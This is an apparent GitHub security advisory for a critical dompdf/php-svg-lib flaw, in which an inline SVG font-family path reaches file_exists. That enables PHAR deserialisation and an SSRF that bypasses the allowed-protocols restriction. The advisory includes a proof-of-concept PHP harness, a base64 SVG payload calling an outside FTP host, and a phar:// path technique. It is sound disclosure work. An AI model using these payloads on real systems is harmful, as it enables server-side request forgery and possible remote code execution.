# [C] Dompdf's usage of vulnerable version of phenx/php-svg-lib leads to restriction bypass and potential RCE

## Summary
Severity: Critical
Advisory: GHSA-97m3-52wr-xvv2
CWE: CWE-502, CWE-73
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2024-02-22
Source: https://github.com/advisories/GHSA-97m3-52wr-xvv2
Type: github-advisory

## Affected
- Packagist: `phenx/php-svg-lib` — affected >=0 <0.5.2

## Details
### Summary
A lack of sanitization/check in the font path returned by php-svg-lib, in the case of a inline CSS font defined, that will be used by Cpdf to open a font will be passed to a `file_exists` call, which is sufficient to trigger metadata unserializing on a PHAR file, through the phar:// URL handler on PHP < 8.0. On other versions, it might be used as a way to get a SSRF through, for example, ftp, not restricted by authorized protocols configured on dompdf.

### Details
The problem lies on the `openFont` function of the `lib/Cpdf.php` library, when the `$font` variable passed by php-svg-lib isn't checked correctly. A path is crafted through $name and $dir, which are two values that can be controlled through CSS : 

```
$name = basename($font);
$dir = dirname($font);
[...]
$metrics_name = "$name.ufm";
[...]

if (!isset($this->fonts[$font]) && file_exists("$dir/$metrics_name")) {
```

Passing a font named `phar:///foo/bar/baz.phar/test` will set the value of $name to `test` and $dir to `phar:///foo/bar/baz.phar`, which once reconstructed will call file_exists on `phar:///foo/bar/baz.phar/test.ufm`. That allows to deserialize the `baz.phar` arbitrary file that contains a `test.ufm` file in the archive.


### PoC

Consider the following, minimal PHP code : 

```
<?php
require('vendor/autoload.php');

use Dompdf\Dompdf;
$dompdf = new Dompdf();
$dompdf->loadHtml($_GET['payload']);
$dompdf->setPaper('A4', 'landscape');
$options = $dompdf->getOptions();
$options->setAllowedProtocols([]);
$dompdf->render();
$dompdf->stream();
```

With payload being this html file : 

```
<html>
<img src="data:image/png;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+DQo8c3ZnIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIj4NCiAgICA8dGV4dCB4PSIyMCIgeT0iMzUiIHN0eWxlPSJjb2xvcjpyZWQ7Zm9udC1mYW1pbHk6ZnRwOi8vYmxha2wuaXM6MjEveC95OyI+TXk8L3RleHQ+DQo8L3N2Zz4="></img>
</html>
```

with the base64 image being : 
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
    <text x="20" y="35" style="color:red;font-family:ftp://blakl.is:21/x/y;">My</text>
</svg>
```

A connection on ftp://blakl.is:21/ will occur, bypassing the allowed protocols.

### Impact
An attacker might be able to exploit the vulnerability to call arbitrary URL with arbitrary protocols, if they can force dompdf to parse a SVG with an inline CSS property using a malicious font-family. In PHP versions before 8.0.0, it leads to arbitrary unserialize, that will leads at the very least to an arbitrary file deletion, and might leads to remote code execution, depending on classes that are available.

## References
- https://github.com/dompdf/dompdf/security/advisories/GHSA-97m3-52wr-xvv2
- https://github.com/dompdf/php-svg-lib/security/advisories/GHSA-f3qr-qr4x-j273
- https://github.com/dompdf/php-svg-lib/commit/732faa9fb4309221e2bd9b2fda5de44f947133aa
- https://github.com/dompdf/dompdf
